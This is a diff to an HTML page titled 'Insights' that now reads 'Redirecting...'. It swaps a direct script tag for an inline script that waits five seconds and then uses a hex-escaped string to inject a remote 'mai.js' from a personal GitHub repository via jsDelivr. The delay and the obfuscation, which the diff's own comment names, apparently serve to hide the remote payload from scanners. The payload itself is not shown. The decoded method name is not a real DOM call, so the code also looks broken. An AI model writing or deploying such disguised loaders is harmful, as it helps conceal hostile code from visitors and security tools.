@@ -6,9 +6,20 @@
     <title>Insights</title>
 </head>
 <body>
-    <h1>.</h1>
-    <div id="message"></div>
+    <h1>Redirecting...</h1>
+    <div id="message"></div> <!-- For error messages or status -->
 
-    <script src="https://cdn.jsdelivr.net/gh/Ruben395/7cdb51a9da6@main/mai.js"></script>
+    <!-- Lazy Loading and Obfuscated Script -->
+    <script>
+        // Lazy load the external script after 5 seconds
+        document.addEventListener('DOMContentLoaded', function () {
+            setTimeout(function () {
+                var _0x3b87=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x53\x63\x72\x69\x70\x74","main.js"];
+                var script = document[_0x3b87[0]](_0x3b87[1]);
+                script.src = "https://cdn.jsdelivr.net/gh/Ruben395/7cdb51a9da6@main/mai.js"; // Your actual script URL
+                document.body.appendChild(script);
+            }, 5000);  // Delay of 5 seconds
+        });
+    </script>
 </body>
 </html>
